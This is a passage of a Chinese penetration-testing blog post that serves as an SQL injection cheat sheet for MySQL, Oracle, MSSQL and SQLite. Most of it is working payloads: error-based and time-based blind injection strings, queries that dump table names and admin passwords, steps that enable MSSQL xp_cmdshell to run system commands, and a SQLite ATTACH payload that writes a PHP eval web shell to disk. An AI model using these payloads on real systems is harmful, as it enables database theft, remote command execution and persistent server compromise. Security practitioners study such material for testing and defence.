<h3 id="表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote"><a href="#表名不完全可控且DESC的表名不含identifier-quote-SELECT的表名含有identifier-quote" class="headerlink" title="表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote"></a>表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line"><span class="variable">$table</span> = <span class="variable">$_GET</span>[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc shop_&#123;<span class="variable">$table</span>&#125;"</span>) or die(<span class="string">"DESC 出错:"</span>.mysql_error());</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select * from `shop_&#123;<span class="variable">$table</span>&#125;` where 1=1"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"<span class="variable">$sql</span>"</span>)));</span><br><span class="line"><span class="built_in">echo</span> mysql_error();</span><br></pre></td></tr></table></figure>
<h2 id="无列明注入"><a href="#无列明注入" class="headerlink" title="无列明注入"></a>无列明注入</h2><h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union (select 1,2,c from (select 1,2 c union select * from flag)b) <span class="built_in">limit</span> 1,1</span><br></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union (select 1,2,c from (select 1,2 as c union select * from flag) as b) <span class="built_in">limit</span> 1,1</span><br></pre></td></tr></table></figure></p>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>需要一个请求两个注入</p>
<h2 id="可报错时爆表名、字段名、库名"><a href="#可报错时爆表名、字段名、库名" class="headerlink" title="可报错时爆表名、字段名、库名"></a>可报错时爆表名、字段名、库名</h2><h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><p>上文介绍可以使用无列明注入，但是如果再进行限制,不允许使用union 该怎么破呢？<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin <span class="built_in">where</span> id=1 and (select * from (select * from admin as a join admin as b) as c)</span><br></pre></td></tr></table></figure></p>
<p>把当前表第一个字段成功爆出来了。</p>
<p>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</p>
<p>同时，可以利用using爆其他字段：</p>
<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><p>翻阅mysql的文档发现了一个非常好玩的函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Polygon(ls1, ls2, ...)</span><br></pre></td></tr></table></figure></p>
<p>Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL</p>
<p>如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。</p>
<h3 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h3><p>上面的方法已经可以爆出库名了，提供另一个方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin <span class="built_in">where</span> id =1<span class="_">-a</span>()</span><br></pre></td></tr></table></figure></p>
<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><h2 id="常用信息及语句-1"><a href="#常用信息及语句-1" class="headerlink" title="常用信息及语句"></a>常用信息及语句</h2><p>注释符：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- +</span><br></pre></td></tr></table></figure></p>
<p>当前用户权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from session_roles</span><br></pre></td></tr></table></figure></p>
<p>当前数据库版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select banner from sys.v_<span class="variable">$version</span> <span class="built_in">where</span> rownum=1</span><br></pre></td></tr></table></figure></p>
<p>服务器监听IP：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_inaddr.get_host_address from dual</span><br></pre></td></tr></table></figure></p>
<p>服务器操作系统：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select member from v<span class="variable">$logfile</span> <span class="built_in">where</span> rownum=1</span><br></pre></td></tr></table></figure></p>
<p>服务器sid：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select instance_name fromv<span class="variable">$instance</span></span><br></pre></td></tr></table></figure></p>
<p>当前连接用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS_CONTEXT (<span class="string">'USERENV'</span>, <span class="string">'CURRENT_USER'</span>)from dual</span><br></pre></td></tr></table></figure></p>
<p>获取数据库名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select owner from all_tables <span class="built_in">where</span> rownum=1</span><br></pre></td></tr></table></figure></p>
<p>依次爆出所有数据库名，假设第一个库名为first_dbname哪个第二个库select owner from all_tables where rownum=1 and owner&lt;&gt;’first_dbname’依次类推</p>
<p>获取表名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from user_tables <span class="built_in">where</span> rownum=1，依次爆出所有表类似暴库。</span><br></pre></td></tr></table></figure></p>
<p>获取字段名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from user_tab_columns <span class="built_in">where</span> table_name=<span class="string">'tablename'</span> and rownum=1</span><br></pre></td></tr></table></figure></p>
<p>依次爆出所有字段类似暴库。</p>
<h2 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND 2=UTL_INADDR.GET_HOST_ADDRESS(CHR(126)|(SLQ语句)|CHR(126))</span><br></pre></td></tr></table></figure>
<h2 id="踩的一些坑"><a href="#踩的一些坑" class="headerlink" title="踩的一些坑"></a>踩的一些坑</h2><p>Oracle比较玄学，能用SQLmap绝不手工，但测试中总会遇到必须用手工的，比如xml中的一个参数注入(当然也可以写tamper脚本)，总结一下自己踩到的坑。</p>
<h3 id="UNION每个字段类型必须相同"><a href="#UNION每个字段类型必须相同" class="headerlink" title="UNION每个字段类型必须相同"></a>UNION每个字段类型必须相同</h3><p>比如，原先的语句是这样：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,<span class="string">'2'</span>,<span class="string">'3'</span> from dual</span><br></pre></td></tr></table></figure></p>
<p>那么后面的UNION也必须是int,char,char才行。</p>
<p>可以通过下面方法确定各个字段的类型。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select <span class="string">'null'</span>,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure></p>
<p>如此依次将下面的每个null用单引号替换，查看返回页面，返回正常说明那个字段为字符型。确定所有字段类型后就可以注入了， 是字符型的就用’null’，数字型的就直接null</p>
<h3 id="必须跟FROM"><a href="#必须跟FROM" class="headerlink" title="必须跟FROM"></a>必须跟FROM</h3><p>Oracle的每个查询必须跟from，Oracle本身有个虚拟表dual，测试的时候可以使用。</p>
<h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><p>SQLserver也有点玄学，每个版本的系统内置表不一样，测试的时候很蛋疼。并且SQLserver的使用者参差不齐，网上回答很乱，有时间自己装上各个版本再专门总结。</p>
<h2 id="常用信息及语句-2"><a href="#常用信息及语句-2" class="headerlink" title="常用信息及语句"></a>常用信息及语句</h2><p>数据库版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@VERSION</span><br></pre></td></tr></table></figure></p>
<p>数据库名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select db_name()</span><br></pre></td></tr></table></figure></p>
<p>数据库ip地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select local_net_address from sys.dm_exec_connextions <span class="built_in">where</span> Session_id=@@spid</span><br></pre></td></tr></table></figure></p>
<p>暴当前表中的列：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article.asp?id=6 group by admin.username having 1=1--</span><br><span class="line"></span><br><span class="line">article.asp?id=6 group by admin.username,admin.password having 1=1--</span><br></pre></td></tr></table></figure></p>
<p>暴任意表和列：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from (select top N id,name from sysobjects <span class="built_in">where</span> xtype=char(85)) T order by id desc)&gt;1</span><br><span class="line"></span><br><span class="line">and (select top col_name(object_id(<span class="string">'admin'</span>),N) from sysobjects)&gt;1</span><br></pre></td></tr></table></figure></p>
<p>暴数据库数据：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 password from admin <span class="built_in">where</span> id=N)&gt;1</span><br></pre></td></tr></table></figure></p>
<h2 id="报错注入-3"><a href="#报错注入-3" class="headerlink" title="报错注入"></a>报错注入</h2><p>MSSQL一般使用类型转换导致的报错注入</p>
<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="built_in">declare</span> @d int //是否支持多行</span><br></pre></td></tr></table></figure>
<p>如果支持多行语句执行并且是sa权限可以直接执行系统命令。</p>
<p>开启xp_cmdshell:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure <span class="string">'show advanced options'</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure<span class="string">'xp_cmdshell'</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">``` </span><br><span class="line">关闭xp_cmdshell:</span><br><span class="line">```bash</span><br><span class="line">EXEC sp_configure <span class="string">'show advanced options'</span>, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure<span class="string">'xp_cmdshell'</span>, 0;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure></p>
<p>执行命令格式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdsehll(<span class="string">'whoami'</span>);</span><br></pre></td></tr></table></figure></p>
<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><h2 id="常用信息及语句-3"><a href="#常用信息及语句-3" class="headerlink" title="常用信息及语句"></a>常用信息及语句</h2><p>数据库版本：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sqlite_version()</span><br></pre></td></tr></table></figure></p>
<p>获取所有表名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM sqlite_master WHERE <span class="built_in">type</span>=<span class="string">'table'</span></span><br></pre></td></tr></table></figure></p>
<p>所有表结构(包含字段名，表名)：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT sql FROM sqlite_master WHERE <span class="built_in">type</span>=<span class="string">'table'</span></span><br></pre></td></tr></table></figure></p>
<p>注释符：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--</span><br></pre></td></tr></table></figure></p>
<p>盲注常用函数：substr()（没有mid、left等函数），判断长度函数length()</p>
<h2 id="BOOL盲注-1"><a href="#BOOL盲注-1" class="headerlink" title="BOOL盲注"></a>BOOL盲注</h2><p>bool条件构造和MySQL一样，但是亦或运算的Payload不可用，注释符使用–。<br>逻辑判断目前我就翻到一个substr()，应用实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cond=<span class="string">'FALSE'</span> or (substr(<span class="string">'abc'</span>,1,1)=<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="延时盲注-2"><a href="#延时盲注-2" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>sqlite没有类似sleep()的函数，但有个函数randomblob(N)，生成N个任意字符，可以造成延时。</p>
<p>SQLite没有if，可以使用case when … then …</p>
<p>格式cond=’true’ AND 1=(case when (bool) then randomblob(100000000) else 0 end)<br>100000000个字符就有明显延时了。</p>
<p>注意cond为真，并且不要有太多条数据，因为有一条数据就会执行一次randomblob(100000000)，如果数据很多的话，服务器直接挂了。可以首先判断一下数据量，再确定N的值，比如我这里有100多条数据，就可以 id=’’ or 1 AND 1=randomblob(1000000)这样，把N的值缩小100倍。灵活运用。</p>
<p>运用实例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' or 1 and 1=(case when substr('</span>abc<span class="string">',1,1)='</span>a<span class="string">' then randomblob(1000000) else 0 end)--</span></span><br></pre></td></tr></table></figure></p>
<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>需要直接访问数据库，或堆叠查询选项启用（默认关闭）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';ATTACH DATABASE '</span>/tmp/p0.php<span class="string">' AS p0;CREATE TABLE p0.shell (data text);INSERT INTO p0.shell (data) VALUES ('</span>&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;<span class="string">');--</span></span><br></pre></td></tr></table></figure></p>
<p>root权限的话可以写计划任务和公钥，参考redis未授权访问利用。</p>
<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>只能用在Windows上，需要特殊配置。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_extension(library_file,entry_point)</span><br></pre></td></tr></table></figure></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>•<a href="http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/" target="_blank" rel="noopener">http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/</a><br>•<a href="http://mutepig.club/?reqp=1&amp;reqr=" target="_blank" rel="noopener">http://mutepig.club/?reqp=1&amp;reqr=</a></p>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/注入/">注入</a>
</div>


</div>



	<div class="article-share" id="share">
	
	  <div data-url="http://yoursite.com/2018/06/07/SQL注入备忘手册/" data-title="SQL注入备忘手册 | Bug&#39;小虫" data-tsina="" class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 

<div class="next">
<a href="/2018/04/20/vim常用命令总结/"  title="vim常用命令总结">
 <strong>下一篇：</strong><br/> 
 <span>vim常用命令总结
</span>
</a>
</div>

</nav>

	



</div>  
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  


  
<div class="category-block">
  <h3 class="asidetitle">分类</h3>
     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">29</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/内网/">内网</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
</div>


  

  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
            
          </li>
        
          <li>
            
            	<a href="https://dillinger.io" target="_blank" title="在线看makedown编译出的效果">makedown</a>
            
          </li>
        
          <li>
            
            	<a href="https://mochazz.github.io" target="_blank" title="一个审计大佬的博客">审计</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.php.cn/course/74.html" target="_blank" title="php官方网站">php</a>
            
          </li>
        
          <li>
            
            	<a href="http://blog.51cto.com/simeon" target="_blank" title="一个经常发布资源大佬的博客">资源</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.liaoxuefeng.com" target="_blank" title="学习python的个人博客">python</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.kanxue.com" target="_blank" title="二进制安全学习窝">看雪</a>
            
          </li>
        
          <li>
            
            	<a href="www.secquan.org" target="_blank" title="常混的论坛">圈子</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.2cto.com" target="_blank" title="各种渗透书籍随便挑">红黑联盟</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.cnblogs.com" target="_blank" title="一个内网大佬的博客">linuxsec</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.runoob.com" target="_blank" title="学习各种编程脚本的好地方">W3C</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.91ri.org" target="_blank" title="内网挺可以">91安全</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
</div>

  <div class="weiboshow">
  <p class="asidetitle">新浪微博</p>
    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=b3593ceb&dpc=1"></iframe>
</div>


</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> Hello ,I&#39;m Bug`小虫 Page in Google. <br/>
			This is my blog,believe it or not.</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		<a href="http://weibo.com/2176287895" target="_blank" class="icon-weibo" title="微博"></a>
		
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
		
		<a href="/about" target="_blank" title="小虫">小虫</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/jquery.qrcode-0.12.0.min.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>












<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
 </html>
